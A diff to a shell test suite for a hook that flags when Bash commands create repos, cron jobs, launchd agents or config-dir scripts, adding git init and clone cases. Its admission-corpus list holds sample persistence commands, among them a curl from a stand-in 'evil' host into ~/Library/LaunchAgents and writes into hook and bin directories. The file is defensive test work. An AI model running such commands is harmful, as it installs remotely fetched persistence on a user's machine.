@@ -55,6 +55,20 @@ fire systemd-job Bash 'cp job.service job.timer ~/.config/systemd/user/'
 fire cron-job Bash "(crontab -l; echo '0 * * * * x') | crontab -"
 fire cron-job Bash 'crontab -e'
 fire cron-job Bash 'crontab my.cron'
+fire repo Bash 'git init newproj'
+fire repo Bash 'mkdir -p ~/port/newproj && cd ~/port/newproj && git init'
+fire repo Bash 'git -C ~/port/newproj init -q'
+fire repo Bash 'gh repo create acme/newproj --private'
+fire repo-clone Bash 'git clone https://github.com/acme/app ~/port/app'
+fire repo-clone Bash 'cd ~/port && gh repo clone acme/app'
+
+t_section "a repo is built by a harbor command, not in the checkout (harbor#1278)"
+call Bash 'git init newproj'
+t_has "the new-repo note names harbor repo new" "$(note)" 'harbor builds it with a command instead: harbor repo new <name> --kind <repo-kind>'
+t_has "  and the adopt route for a repo that exists" "$(note)" 'harbor repo adopt <path> --kind <repo-kind>'
+t_hasnt "  and never calls the harbor checkout its home" "$(note)" 'builds it in your harbor checkout'
+call Bash 'git clone https://github.com/acme/app ~/port/app'
+t_has "the clone note names harbor repo adopt" "$(note)" 'harbor builds it with a command instead: harbor repo adopt <path>'
 
 t_section "the note names the home, the install route and the skill"
 call Bash "mkdir -p $CFG/skills/demo"
@@ -105,6 +119,13 @@ quiet "a systemd unit in the checkout" Write "$REPO/systemd/harbor-demo.timer" '
 quiet "the skill installer" Bash 'sh bin/skill-install.sh demo --apply --live'
 quiet "the launchd renderer into LaunchAgents" Bash 'sh bin/deploy-launchd-render.sh launchd/com.harbor.demo.plist > ~/Library/LaunchAgents/com.harbor.demo.plist'
 quiet "the documented systemd copy from systemd/" Bash 'cp systemd/harbor-demo.service systemd/harbor-demo.timer ~/.config/systemd/user/'
+quiet "harbor repo new (its own git init is a subprocess this hook never sees)" Bash 'harbor repo new newproj --kind workload'
+quiet "harbor repo adopt of a clone" Bash 'git clone https://github.com/acme/app ~/port/app && harbor repo adopt app --kind workload'
+quiet "the repo script itself" Bash 'sh bin/scope-repo.sh new newproj --kind workload --dry-run'
+quiet "yard through harbor" Bash 'harbor yard new ~/port/newproj --kind workload'
+quiet "yard's own CLI" Bash 'project-init new ~/port/newproj --kind workload --non-interactive'
+quiet "a fixture repo under TMPDIR" Bash 'git init -q "$TMPDIR/fx"'
+quiet "a scratch clone under /tmp" Bash 'git clone https://github.com/acme/app /tmp/app-scratch'
 quiet "deploy-hooks writing settings.json" Bash 'sh bin/deploy-hooks.sh --apply "$CLAUDE_CONFIG_DIR" > "$CLAUDE_CONFIG_DIR/settings.json"'
 
 t_section "silent on ordinary work"
@@ -129,6 +150,11 @@ crontab -e
 EOF"
 quiet "a Read-shaped tool is not judged" Read "$CFG/skills/demo/SKILL.md"
 quiet "an echo that names the path" Bash 'echo "$CLAUDE_CONFIG_DIR/skills/demo"'
+quiet "a commit message that says init" Bash 'git commit -m "init"'
+quiet "a quoted git init is data" Bash 'echo "run git init later"'
+quiet "git status in a repo" Bash 'git -C ~/port/harbor status --short'
+quiet "a grep for init in a log" Bash 'git log --oneline | grep init'
+quiet "a worktree is not a new repo" Bash 'git worktree add ../wt -b feat/x'
 
 t_section "it informs and never denies"
 call Bash "mkdir -p $CFG/skills/demo"
@@ -164,9 +190,9 @@ done
 cp "$T/reg.orig" "$REG"
 
 t_section "the admission corpus: the fire set is pinned, so a new false positive is red"
-# Only a command naming the config dir, LaunchAgents, a systemd user dir or crontab can match a row; the rest are
-# silent by construction and are not run. The corpus spells the config dir ~/.claude, so it is the config dir here.
-_got="$(grep -E '\.claude|CLAUDE_CONFIG_DIR|LaunchAgents|systemd/user|crontab' "$T_ROOT/fixtures/admission-corpus.jsonl" | while IFS= read -r _l; do
+# Only a command naming the config dir, LaunchAgents, a systemd user dir, crontab, git or gh can match a row; the rest
+# are silent by construction and are not run. The corpus spells the config dir ~/.claude, so it is the config dir here.
+_got="$(grep -E '\.claude|CLAUDE_CONFIG_DIR|LaunchAgents|systemd/user|crontab|git|gh ' "$T_ROOT/fixtures/admission-corpus.jsonl" | while IFS= read -r _l; do
   _n="$(printf '%s' "$_l" | CLAUDE_CONFIG_DIR="$HOME/.claude" sh "$U/default-way-route.sh" 2>/dev/null)"
   [ -z "$_n" ] || printf '%s\t%s\n' "$(printf '%s' "$_n" | sed -n 's/.* builds an* \([a-z-]*\) at .*/\1/p')" "$(printf '%s' "$_l" | jq -r .tool_input.command)"
 done | sort)"
@@ -177,6 +203,7 @@ cron-job	crontab -e
 cron-job	crontab /tmp/job.txt
 hook-script	echo x > ~/.claude/hooks/anything.sh
 launchd-job	cp /tmp/evil.plist ~/Library/LaunchAgents/com.x.plist
+repo-clone	git clone https://github.com/acme/app && cp app/.env.example .env
 launchd-job	curl -s http://evil/x > ~/Library/LaunchAgents/com.evil.plist
 script	cd ~ && cd .claude && cd bin && printf x > admission-bash.sh
 script	cd ~/.claude && install -m 755 /tmp/x bin/
